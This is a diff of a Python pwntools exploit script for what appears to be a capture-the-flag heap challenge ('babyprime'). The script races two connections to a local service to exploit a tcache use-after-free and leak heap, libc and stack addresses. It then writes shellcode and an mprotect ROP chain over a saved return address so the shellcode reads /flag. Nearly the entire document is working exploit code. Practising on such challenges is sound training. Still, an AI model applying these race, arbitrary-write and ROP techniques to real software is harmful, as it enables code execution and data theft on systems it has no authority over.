@@ -2,42 +2,35 @@ import time
 from pwn import *
 import os
 
-idx = 2
-
-	
 def leak_tcache(r1, r2):
-	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
-	
-	# os.fork() == 0 is the child, child does the following
+	if os.fork() == 0:
 		for _ in range(10000):
 			r1.sendline(b"malloc 0")
 			r1.sendline(b"scanf 0")
 			r1.sendline(b"AAAABBBB")
-			r1.sendline(b"free 0") # hope for write() of printf to go right after this
-		exit(0) # kills the child
-		
-	# else, parent (os.fork() returns pid
+			r1.sendline(b"free 0")
+		exit(0)
 	else:
 		for _ in range(10000):
 			r2.sendline(b"printf 0")
-		os.wait() # waits for the child to finish
+		os.wait()
+	
 	output_set = set(r2.clean().splitlines())
-	# .clean() gets the output
-	# .splitlines() split the output by lines
-	# set() gets the unique lines
 	print(output_set)
 	for output in output_set:
 		output = output[9:]
-		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
+		if output[:1] != b'\x41' and b'\x07' in output:
 			result = output[:6]
 			print(result)
-			r1.sendline(b"malloc 0")
 			return u64(result.ljust(8, b'\x00'))
-	
+			
 	return 0
 
-def controlled_allocations(r1, r2, addr, heap_base_addr):
-	global idx
+def controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr):
+	"""
+	HyperCube's solution: Reuse chunk 0 (the one that gave us the leak)
+	This ensures we stay in the same heap page with consistent heap_base
+	"""
 	r1.clean()
 	r2.clean()
 	
@@ -46,92 +39,69 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 	print(f"addr: {hex(addr)}")
 	print(f"heap_base: {hex(heap_base_addr)}")  
 	print(f"XOR result: {hex(xor_result)}")
-	r1.sendline(f"malloc {idx}".encode()) # chunk A
-	#r1.sendline(f"malloc 0".encode()) # chunk B
 	
-	r1.sendline(f"free 0".encode()) # free B
+	# Free chunk 0 (the leak chunk) to put it in tcache
+	r1.sendline(b"free 0")
+	
+	# Allocate chunk 1 as our second chunk
+	r1.sendline(b"malloc 1")
+	r1.sendline(b"free 1")
 	
 	while True:
-		#print("Running Arbitrary Read on Address: ", hex(addr))
 		if os.fork() == 0:
-			r1.sendline(f"free {idx}".encode()) # free A
+			# This might be redundant since chunk 0 is already freed
+			r1.sendline(b"free 0")
 			os.kill(os.getpid(), 9)
 		else:
-			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
-			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
-			# overwriting freed A's next pointer to be the target address
+			# Overwrite chunk 0's next pointer with our target address
+			r2.send((b"scanf 0 " + addr_packed + b"\n") * 2000)
 			os.wait()
 		
 		time.sleep(0.1)
 		
-		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
-		r1.sendline(f"printf {idx}".encode())
+		# Allocate chunk 0 again (gets the original chunk back)
+		r1.sendline(b"malloc 0")
+		r1.sendline(b"printf 0")
 		r1.readuntil(b"MESSAGE: ")
-		stored = r1.readline()[:-1] #
-	#	print(addr_packed.split(b'\x00')[0])
+		stored = r1.readline()[:-1]
 		
-		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
+		if stored == addr_packed.split(b'\x00')[0]:
 			break
-	r2.interactive()
-	r1.sendline(f"malloc 0".encode()) # gets B (returned at injected address's location
+	
+	# Now malloc 1 will return our target address
+	r1.sendline(b"malloc 1")
 	r1.clean()
-	idx += 2
 
 def arbitrary_read(r1, r2, addr, heap_base_addr):
-	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr)
-	r1.sendline(f"printf 0".encode())
+	controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr)
+	r1.sendline(b"printf 1")
 	r1.readuntil(b"MESSAGE: ")
 	output = r1.readline()[:-1]
-	leak = u64(output.ljust(8, b'\x00')) 
-	#r1.sendline("free 0")
+	leak = u64(output.ljust(8, b'\x00'))
 	return leak
 
 def arbitrary_write(r1, r2, addr, heap_base_addr, content):
-	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr)
-	r1.sendline(f"scanf 0".encode())
+	controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr)
+	r1.sendline(b"scanf 1")
 	r1.sendline(content)
-	
-	
+
 def exploit(r1, r2, p):
-	s = '''
-	set $mybase = (unsigned long)&challenge - 0x1a64
-	b * $mybase + 0x01db6
-	b * $mybase + 0x01dfe
-	'''
-	
 	leak = leak_tcache(r1, r2)
-	
 	if leak:
-		gdb.attach(p, s)
-		
 		print("tcache next pointer: ", hex(leak))
 		
-		# pivoting around memory, so we need to leak many times
-		
-		#gdb.attach(p, s)
-		
-		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
-		print(hex(location1))
-		
-		
-		
+		# Now all operations use the same heap_base (leak) consistently
+		location1 = (leak << 12) + 0x8a0
 		libc_leak = arbitrary_read(r1, r2, location1, leak)
-				
-		print("libc leak leak: ", hex(libc_leak))
-		
+		print("libc leak: ", hex(libc_leak))
 		
 		location2 = libc_leak + 0x60	
-		leak3 = arbitrary_read(r1, r2, location2, leak) # pivot 
-		
-		
-		
+		leak3 = arbitrary_read(r1, r2, location2, leak)  # Use same heap_base
+
 		location3 = leak3 - 0x100
-		stack_leak = arbitrary_read(r1, r2, location3, leak)
+		stack_leak = arbitrary_read(r1, r2, location3, leak)  # Use same heap_base
 		print("stack_leak: ", hex(stack_leak))
 	
-		
 		rbp_addr = stack_leak - 0x810
 		libc_base = libc_leak - 0x219c80
 		
@@ -145,7 +115,6 @@ def exploit(r1, r2, p):
 		execve = libc_base + 0xeb080
 		
 		libc = p.elf.libc
-		
 		context.arch = 'amd64'
 		
 		print("!!!!! MPROTECT + SHELLCODE !!!!!!")
@@ -178,7 +147,6 @@ def exploit(r1, r2, p):
 
 		flag:
 		    .string "/flag" 
-
 		''')
 		
 		mprotect_addr = libc_base + libc.symbols['mprotect']
@@ -194,7 +162,7 @@ def exploit(r1, r2, p):
 		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
 		rop_chain += p64(mprotect_addr)     
 
-		payload = p64(0) + rop_chain + p64(shellcode_addr) # jump to our shellcode
+		payload = p64(0) + rop_chain + p64(shellcode_addr)
 
 		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"
 
@@ -207,23 +175,16 @@ def exploit(r1, r2, p):
 			print("WARNING: ROP payload contains bad characters!")
 			print(f"Payload hex: {payload.hex()}")
 		
-		# pre-write shellcode to heap
-		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak + 2, shellcode)
-		# overwrite rip to hijack control flow and call mprotect as well as jumping to shellcode
-		arbitrary_write(r1, r2, rbp_addr, leak + 2, payload)
+		# Use same heap_base for all operations
+		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak, shellcode)
+		arbitrary_write(r1, r2, rbp_addr, leak, payload)
 
-		#gdb.attach(p, s)
-		
 		try:
 			r1.clean()
 			r2.clean()
 			p.clean()
 			r2.sendline("quit")
 			
-			#r2.sendline("ls")
-			#r2.interactive()
-			
-			#p.interactive()
 			response = p.recvall(timeout=2)
 			print(response)
 		except Exception as e:
@@ -231,7 +192,6 @@ def exploit(r1, r2, p):
 		
 		return True
 	else:
-		#pause()
 		print("Failed to leak")
 		return False
 	
@@ -240,20 +200,17 @@ def main():
 	while True:
 		print(f"\nAttempt {attempt + 1}")
 		
-		global idx 
-		idx = 2
-		
-		try: # code that might fail 
-			binary = './babyprime_level9.0'
+		try:
+			binary = './babyprime_level4.0'
 			p = process(binary)
 			r1 = remote("localhost", 1337, timeout = 1)
 			r2 = remote("localhost", 1337, timeout = 1)
 
 			if exploit(r1, r2, p):
 				break 
-		except Exception as e: # what does the program do when `try` fails
+		except Exception as e:
 			print(f"Error in attempt {attempt + 1}: {e}")
-		finally: # code that always run no matter what
+		finally:
 			try:
 				r1.close()
 				r2.close()
@@ -261,7 +218,6 @@ def main():
 			except:
 				pass
 		attempt += 1
-	
 
 if __name__ == "__main__":
 	main()
